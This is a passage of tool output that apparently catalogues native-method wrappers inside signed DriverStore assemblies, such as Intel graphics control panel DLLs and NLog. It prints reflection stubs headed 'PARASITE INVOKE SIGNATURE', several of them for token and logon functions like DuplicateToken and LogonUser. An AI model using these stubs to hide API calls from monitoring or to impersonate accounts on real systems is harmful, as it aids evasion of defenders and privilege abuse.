        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglMakeCurrent"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc, IntPtr hglrc });
        ===END SIGNATURE===

Method: wglDeleteContext
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglDeleteContext"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hglrc });
        ===END SIGNATURE===

Method: glGetString
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""glGetString"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { GLStringNames name });
        ===END SIGNATURE===

Method: OpenProcessToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""OpenProcessToken"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr ProcessHandle, int DesiredAccess, IntPtr& TokenHandle });
        ===END SIGNATURE===

Method: CloseHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""CloseHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: DuplicateToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""DuplicateToken"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, IntPtr& DuplicateTokenHandle });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\IntelGraphicsAGS.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.SDKCommandLine.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.WinService.exe

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.igccservice"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle, ServiceStatus& serviceStatus });
        ===END SIGNATURE===

Method: RegisterTypeLib
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.COMManager.RegisterLibs"", true);
        var methodInfo = t.GetMethod(""RegisterTypeLib"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { ITypeLib tlib, string szFullPath, string szHelpDir });
        ===END SIGNATURE===

Method: UnRegisterTypeLib
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.COMManager.RegisterLibs"", true);
        var methodInfo = t.GetMethod(""UnRegisterTypeLib"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid& libID, ushort wVerMajor, ushort wVerMinor, int lcid, SYSKIND syskind });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\AGS.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\LiteDB.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\Newtonsoft.Json.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\Newtonsoft.Json.Schema.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll

Method: LogonUser
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LogonUser"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string pszUsername, string pszDomain, string pszPassword, int dwLogonType, int dwLogonProvider, IntPtr& phToken });
        ===END SIGNATURE===

Method: CloseHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CloseHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: DuplicateToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DuplicateToken"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr existingTokenHandle, int impersonationLevel, IntPtr& duplicateTokenHandle });
        ===END SIGNATURE===

Method: OutputDebugString
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""OutputDebugString"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { string message });
        ===END SIGNATURE===

Method: QueryPerformanceCounter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryPerformanceCounter"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { UInt64& lpPerformanceCount });
        ===END SIGNATURE===

Method: QueryPerformanceFrequency
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryPerformanceFrequency"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { UInt64& lpPerformanceFrequency });
        ===END SIGNATURE===

Method: GetCurrentProcessId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetCurrentProcessId"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: GetModuleFileName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetModuleFileName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr hModule, StringBuilder lpFilename, int nSize });
        ===END SIGNATURE===

Method: CreateFile
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.Win32FileNativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateFile"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        Microsoft.Win32.SafeHandles.SafeFileHandle result = (Microsoft.Win32.SafeHandles.SafeFileHandle) methodInfo.Invoke(null, new object[] { string lpFileName, FileAccess dwDesiredAccess, int dwShareMode, IntPtr lpSecurityAttributes, CreationDisposition dwCreationDisposition, Win32FileAttributes dwFlagsAndAttributes, IntPtr hTemplateFile });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.COMLibrary.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CommunicationService.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll

Method: SetCursorPos
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Util.MousePointerManager"", true);
        var methodInfo = t.GetMethod(""SetCursorPos"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { int x, int y });
        ===END SIGNATURE===

Method: GetCursorPos
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Util.MousePointerManager"", true);
        var methodInfo = t.GetMethod(""GetCursorPos"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { MousePoint& lpPoint });
        ===END SIGNATURE===

Method: EnumDisplayDevices
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""EnumDisplayDevices"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpDevice, int iDevNum, DISPLAY_DEVICE& lpDisplayDevice, int dwFlags });
        ===END SIGNATURE===

Method: EnumDisplaySettings
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""EnumDisplaySettings"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { string lpszDeviceName, int iModeNum, DEVMODE& lpDevMode });
        ===END SIGNATURE===

Method: ChangeDisplaySettingsEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChangeDisplaySettingsEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Display.Model.DispModeError result = (OneApp.IGCC.CoreLibrary.Display.Model.DispModeError) methodInfo.Invoke(null, new object[] { string lpszDeviceName, DEVMODE& lpDevMode, IntPtr hwnd, CDSFlags dwflags, IntPtr lParam });
        ===END SIGNATURE===

Method: ChangeDisplaySettingsEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChangeDisplaySettingsEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Display.Model.DispModeError result = (OneApp.IGCC.CoreLibrary.Display.Model.DispModeError) methodInfo.Invoke(null, new object[] { string lpszDeviceName, IntPtr lpDevMode, IntPtr hwnd, CDSFlags dwflags, IntPtr lParam });
        ===END SIGNATURE===

Method: SetDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { uint numPathArrayElements, DCPathInfo[] pathArray, uint numModeInfoArrayElements, DCModeInfo[] modeInfoArray, SdcFlags flags });
        ===END SIGNATURE===

Method: QueryDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, DCPathInfo[] pathInfoArray, UInt32& modeInfoArrayElements, DCModeInfo[] modeInfoArray, DCTopologyId& topologyId });
        ===END SIGNATURE===

Method: QueryDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, DCPathInfo[] pathInfoArray, UInt32& modeInfoArrayElements, DCModeInfo[] modeInfoArray, IntPtr topologyId });
        ===END SIGNATURE===

Method: GetDisplayConfigBufferSizes
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDisplayConfigBufferSizes"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, UInt32& numModeInfoArrayElements });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetDeviceName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetBaseType& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCAdapterName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSourceDeviceName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetPreferredMode& preferredMode });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSupportVirtualResolution& supportVirtualResolution });
        ===END SIGNATURE===

Method: DisplayConfigSetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigSetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSupportVirtualResolution supportVirtualResolution });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetupDiGetClassDevs
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetClassDevs"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { Guid& ClassGuid, int Enumerator, IntPtr hwndParent, uint Flags });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr lpInfoSet, uint dwIndex, SP_DEVINFO_DATA& devInfoData });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInterfaces
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInterfaces"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo, IntPtr devInfo, Guid& interfaceClassGuid, uint memberIndex, SP_DEVICE_INTERFACE_DATA& deviceInterfaceData });
        ===END SIGNATURE===

Method: SetupDiGetDeviceInterfaceDetail
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceInterfaceDetail"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo, SP_DEVICE_INTERFACE_DATA& deviceInterfaceData, SP_DEVICE_INTERFACE_DETAIL_DATA& deviceInterfaceDetailData, uint deviceInterfaceDetailDataSize, UInt32& requiredSize, SP_DEVINFO_DATA& deviceInfoData });
        ===END SIGNATURE===

Method: SetupDiOpenDevRegKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiOpenDevRegKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hDeviceInfoSet, SP_DEVINFO_DATA& deviceInfoData, uint scope, uint hwProfile, uint parameterRegistryValueKind, uint samDesired });
        ===END SIGNATURE===

Method: SetupDiGetDevicePropertyW
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDevicePropertyW"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
